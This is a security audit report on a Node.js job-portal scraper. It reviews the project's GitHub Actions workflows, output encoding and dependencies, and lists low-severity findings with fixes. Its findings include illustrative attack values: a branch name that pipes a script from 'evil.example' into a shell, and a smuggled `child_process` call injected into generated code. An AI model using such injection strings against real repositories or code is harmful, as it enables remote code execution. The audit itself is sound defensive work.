# Security Audit — sarkari-scraper

- **Date:** 2026-09-06
- **Version audited:** 1.8.0 (branch `arena/01a078ba-sarkari-scraper`, from `main` @ `b11e36e`)
- **Scope:** all first-party source (`*.js`), GitHub Actions workflows, devcontainer, dependency tree, docs claims vs. actual behaviour
- **Method:** manual source review of every module and workflow, secret-pattern scan, dependency audit (`npm audit` + lockfile inspection), regex/ReDoS inventory, dynamic-code-execution inventory, full test-suite run. No live scraping was performed.

---

## 1. Executive summary

**Overall posture: GOOD.** This is an unusually security-conscious scraper. The project's own threat model ("scraped content is untrusted input", `docs/SECURITY.md`) is real and enforced in code at every output boundary, and every claim in the security docs was verified against the implementation — we found no false claims.

- **0 known vulnerabilities** in the dependency tree (`npm audit`, axios 1.20.0 / cheerio 1.2.0 / sql.js 1.14.2 — all current).
- **No hardcoded secrets** (scanned for GitHub PATs, Telegram bot tokens, Google/AWS keys, Slack tokens).
- **175/175 tests pass**, including a dedicated red-team regression suite (`test/hardening.test.js`).
- **No Critical or High findings.** All findings below are Low / Informational hardening items — mostly in the CI layer, not the scraper core.

| #   | Finding                                                                                       | Severity | Location                              |
| --- | --------------------------------------------------------------------------------------------- | -------- | ------------------------------------- |
| 1   | Direct `${{ github.ref_name }}` interpolation into a `run:` script (script-injection pattern) | **Low**  | `.github/workflows/rss-watch.yml`     |
| 2   | `curl \| bash` install of actionlint from an unpinned `main` branch                           | **Low**  | `.github/workflows/ci.yml`            |
| 3   | Third-party Actions pinned to mutable tags, not commit SHAs                                   | **Low**  | all workflows                         |
| 4   | `WATCH_PAT` documented as classic PAT with full `repo` scope                                  | **Low**  | `rss-watch.yml`, `docs/AUTOMATION.md` |
| 5   | `--entry` embedded unescaped into generated JS in the scaffolder                              | **Low**  | `tools/new-source.js`                 |
| 6   | Discord embed links not scheme-validated / markdown-escaped                                   | Info     | `utils/notify.js`                     |
| 7   | Wayback `/save/` URL built without encoding                                                   | Info     | `utils/enrich.js`                     |
| 8   | No cap on _decompressed_ response size (gzip-bomb memory pressure)                            | Info     | `utils/http.js`                       |
| 9   | robots.txt fails open on fetch/parse errors                                                   | Info     | `utils/robots.js`                     |
| 10  | `--upload` posts the digest to a permanent public file host                                   | Info     | `utils/enrich.js`, docs               |
| 11  | State object keyed by URL is prototype-assignment-corruptible by a crafted input file         | Nit      | `utils/digest.js`                     |
| 12  | actionlint runs with shellcheck integration disabled                                          | Nit      | `ci.yml`                              |

---

## 2. What this project solves (context for the audit)

A Node.js CLI + GitHub-Actions pipeline that turns Indian government-job portals
(sarkariresult.com, freshersnow.com, upsc.gov.in, …) and any RSS/Atom feed into
structured data (JSON/CSV), deduplicated alert digests, RSS 2.0 feeds, iCal
deadlines and Telegram/Discord/webhook notifications — free, keyless, no server.
Useful for job aspirants, telegrams/channels serving them, and anyone tracking
public-sector hiring in India. (See `README.md`.)

Security-relevant because it: (a) parses untrusted third-party HTML at scale,
(b) pushes that content into chat clients, spreadsheets, calendars and public
URLs, (c) runs unattended on a schedule with write access to its own repo.

---

## 3. Verified strengths

These were each checked in source, not taken from docs.

**Input containment (SSRF / crawl-escape / injection)**

- Domain **allowlist** is the single enforcement point: CLI `-d` values are validated against `utils/sources.js` (`allowed:` in `run-scrapper.js`, `scrap-job-list.js`), and `-u` URLs must resolve to a registered host (`resolveDomain()` in all four `scrap-*.js`). Dynamic `require("./scripts/" + domain + …)` is therefore not a path-traversal primitive.
- Scheme checks everywhere a URL is accepted: `http(s)` only (`helper.isHttpUrl`, `feed.js itemsToJobs`, feed-URL validation in `job-digest.js`/`rss-watch.js`, `enrich.js` shortener/archiver).
- **Same-site guard** for pagination and job links; off-site redirects warn (`crawl.js`, `run-scrapper.js`); pagination loop detection via visited-set; hard `--max-pages` / `--max-jobs` caps.
- Link targets rendered into Telegram are restricted to `http(s)` (`notify.safeHttpUrl`) so `javascript:`/`data:` URIs cannot reach chat clients.
- robots.txt respected by default; `--ignore-robots` is an explicit override.

**Output encoding (verified against hostile fixtures in `test/hardening.test.js`)**

- CSV: formula-injection defense — cells matching `/^\s*[=+\-@]/` are prefixed with `'` (`utils/csv.js sanitizeCell`) and applied recursively through `parse()`.
- RSS/XML: entity escaping **plus** stripping XML-1.0-forbidden control characters (char-code loop, no ReDoS surface) (`utils/rss.js`).
- ICS: `\ ; ,` and newline escaping, 2000-char cap, invalid dates skipped instead of throwing (`utils/calendar.js`).
- Telegram HTML: `& < > "` escaped on all interpolated text, surrogate-safe truncation, http(s)-only hrefs (`utils/notify.js`).

**Data stores & state**

- SQLite via `sql.js` (pure WASM — deliberately avoids native-binary download supply-chain steps) with **parameterized statements only** (`utils/notifydb.js`); no string-built SQL anywhere.
- Bloom filter uses SHA-256 double-hashing; positives always confirmed against the exact table, so no false "already notified" (`utils/bloom.js`).
- `*.db`, `.env`, state files gitignored — alert history never lands in git.

**Bounded work (DoS resistance)**

- 20 MB `maxContentLength` per response, 256 KB robots.txt cap, robots fetch timeout, table row/col/record caps (100×20, 200 records), rowspan/colspan clamped to 100, per-job pincode cap, 450/1500/2000/4000-char caps before text goes to third-party APIs, concurrency clamped 1–10, retries capped with `Retry-After` ceiling of 60 s.
- Regex inventory across `utils/` + `scripts/`: no nested/unbounded quantifier patterns on untrusted input; the one risky spot (domain validation) length-caps input _before_ the regex (`new-source.js`).
- Availability behaviours that double as security: alert **quarantine** after 3 failures (a poison record can't fail every run forever), state rollback on alert failure, fail-soft enrichment.

**Secrets & process hygiene**

- Credentials only from env vars (never CLI flags — avoids shell-history/process-list leakage); proxy credentials parsed but never logged (`parsed.origin` only); log/data stream separation (stdout = data, stderr = logs).
- No `eval`, `new Function`, `spawn`, or `child_process` in production code (only in tests, via `execFile` of the CLIs themselves).
- No `pull_request_target`, no `id-token`, no cache-tampering surface; fork PRs get no secrets. `scrape.yml` correctly routes _all_ attacker-influenceable inputs (`domains`, `max-pages`, `max-jobs`, `reason` incl. `client_payload.reason`) through **env-var indirection** — the correct defense against Actions script injection (verified: no direct `${{ inputs.* }}` or `${{ github.event.* }}` in any `run:` block of that workflow).

**Supply chain**

- `npm audit` clean at audit time; CI gates on `npm audit --audit-level=high`; Dependabot weekly for npm + Actions; dependency list is tiny (5 runtime deps).

---

## 4. Findings & recommendations

### 1. (Low) Script-injection pattern in `rss-watch.yml` — `${{ github.ref_name }}`

```yaml
run: |
  gh workflow run scrape.yml --ref "${{ github.ref_name }}" -f reason="..."
```

Git refs may legally contain `$`, backticks, `(`, `)`. A branch named e.g.
`dev$(curl -s evil.example|sh)` executed via `workflow_dispatch` (requires
write access) interpolates directly into the shell — unlike `scrape.yml`,
which handles this correctly with env-var indirection. `steps.watch.outputs.count`
in the Summary step is also interpolated directly (safe today — the tool emits
only a number — but the same pattern).
**Fix:** one-line change each: `env: REF: ${{ github.ref_name }}` then
`--ref "$REF"`; do the same for `count`.

### 2. (Low) Unpinned `curl | bash` in CI

`ci.yml` installs actionlint by piping the script from `rhysd/actionlint@main`
into bash. If that repo's main branch is ever compromised, arbitrary code runs
in CI.
**Fix:** pin to a release tag and verify the published SHA-256 checksum, or
install a release tarball by digest.

### 3. (Low) Actions pinned to mutable tags

`actions/checkout@v4`, `actions/setup-node@v4`, `actions/upload-artifact@v4`.
Dependabot keeps them current, but tag movement is a classic CI escape for a
repo whose workflows hold `contents: write` and a PAT secret.
**Fix:** pin to full commit SHAs (Dependabot comments the SHA in its PRs).

### 4. (Low) `WATCH_PAT` over-provisioned

Docs recommend a classic PAT with `repo` scope — full read/write of **all** the
owner's repos — for one job: triggering a workflow.
**Fix:** fine-grained PAT limited to this repository with _Actions:
read/write_, short expiry; or a GitHub App token (the docs already note this is
"safer at scale"). A leaked `WATCH_PAT` today is a repo-takeover-grade secret.

### 5. (Low) Codegen injection in the scaffolder

`tools/new-source.js` embeds `--entry` into generated source as
`module.exports.jobListUrl = "` + entry + `";`. The only validation is
`/^https?:\/\//i`, so an entry like
`https://x/"; require("child_process").execSync("…");//` produces a parser file
containing attacker-chosen code. This is a developer tool (self-inflicted /
social-engineering vector — e.g. a "try this command" gist), not reachable from
scraped data.
**Fix:** emit `JSON.stringify(entry)` in the templates.

### 6. (Info) Discord embed link hygiene

In `formatDiscordEmbed`, `applyUrl` is scheme-validated, but `calLink` and
`archiveUrl` are interpolated into Markdown links raw, and no link text is
markdown-escaped (a `)` in a URL breaks the link; `](https://evil)` could
re-target it). `calLink` is locally generated (`https://calendar.google.com/…`)
and `archiveUrl` comes from web.archive.org's final redirect, so exploitability
is negligible — matches the "cosmetic only" accepted risk in `docs/SECURITY.md`.
**Hardening:** route all three through `safeHttpUrl()`.

### 7. (Info) Wayback save URL not encoded

`archivePage()` builds `…/save/ + url` without `encodeURIComponent`; a crafted
job URL can manipulate the path/query _within_ web.archive.org (the host is
fixed and `..` cannot escape above root). **Hardening:** encode or re-parse the
composed URL.

### 8. (Info) Decompressed-size not capped

axios `maxContentLength` bounds the transfer; a hostile page served gzip-bombed
can expand far larger in memory before cheerio parses it. Practical impact is
limited (known sources, Actions runners, 20 MB transfer cap) but a
post-fetch `Buffer.byteLength(response.data)` check before `cheerio.load()`
would close it.

### 9. (Info) robots.txt fails open

Fetch/parse errors are treated as "allowed" — documented and standard crawler
behaviour, but worth restating in an audit: a site that _wants_ to be excluded
and breaks its robots.txt (404 with HTML is handled; 500s fail open) is not
protected. Conscious trade-off, keep.

### 10. (Info) `--upload` publishes permanently & publicly

The digest JSON goes to catbox.moe as a **permanent, public, keyless** link.
Content is scraped public job ads (no personal data), and uploads are opt-in,
but the permanence deserves an explicit warning in `docs/INTEGRATIONS.md`
(currently just says "Permanent public link"). There is no delete path.

### 11. (Nit) Prototype-assignment in digest state

`diffJobs()` does `state.jobs[job.url] = {…}` on a plain object. A crafted
`--input` file with a job whose URL is exactly `__proto__` would re-point the
object's prototype and corrupt state (local, operator-supplied input; not
reachable from scraped URLs, which are always `http(s)://…`).
**Fix:** `Object.create(null)` or a `Map` for `state.jobs` / `quarantine` /
caches.

### 12. (Nit) shellcheck disabled in workflow linting

`./actionlint -shellcheck=` disables shell-script linting — the exact check
that would flag quoting regressions in future workflow edits. Enable it (and
finding 1 would likely have been caught).

---

## 5. Threat-model notes (what's intentionally _not_ a finding)

- **Scraped HTML → cheerio** is non-executing parsing; scripts in pages never run.
- **`--input` files are trusted operator data**; hostile JSON can at worst
  corrupt local state (finding 11) — by design, matching a CLI tool model.
- **Third-party enrichment APIs** (Pollinations, MyMemory, postalpincode.in,
  Nager.Date, CleanURI, Catbox, Wayback) receive only public job text, capped
  in size, fail-soft; all responses are validated before use and cached.
- **`repository_dispatch` is authenticated** by GitHub (requires a token with
  write access); the advertised "any external watcher" API cannot be abused
  anonymously, and its `reason` payload reaches shells only via env-var
  indirection (safe) and `data/lastrun.json` (plain JSON file write).

---

## 6. Remediation priority

1. Now (one-liners): findings **1**, **5**, **12**.
2. Next CI hardening pass: **2**, **3**, **4**.
3. Backlog hardening: **6**, **7**, **8**, **11**; doc tweaks for **10**.

No finding blocks release. Re-run this audit after any change to workflow
inputs, the HTTP client, or a new output sink (a new chat/alert transport is
the most likely place to regress output encoding).
